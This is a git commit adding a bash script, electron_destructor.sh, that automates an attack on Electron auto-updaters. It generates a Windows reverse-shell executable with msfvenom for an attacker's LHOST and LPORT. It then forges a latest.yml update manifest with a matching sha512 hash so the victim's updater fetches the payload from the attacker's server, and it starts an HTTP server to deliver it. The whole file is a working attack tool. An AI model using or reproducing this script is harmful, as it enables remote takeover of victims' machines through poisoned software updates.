e2b091fa6ae01c2ccf8f349da0ad982cd816b62b
Far1s-404 <79370746+Far1s-404@users.noreply.github.com>
2021-07-14 10:32:58 -0400

    Add files via upload

---
+++ electron_destructor.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+read -e -p "LHOST=" LHOST
+read -e -p "LPORT=" LPORT
+read -e -p "Choose name=" PAYLOAD
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $PAYLOAD
+
+cat - <<EOF > latest.yml
+version: 2.0.9
+path: http://${LHOST}/${PAYLOAD}
+sha512: $(sha512sum "${PAYLOAD}" | cut -d' ' -f1 | xxd -p -r | base64 -w0)
+releaseDate: '$(date --utc +%FT%T.%3NZ)'
+EOF
+
+echo "Run your lisner on the port $LPORT you specified"
+sleep 1
+echo "Upload latest.yml to the target and wait"
+sleep 3
+python3 -m http.server 80
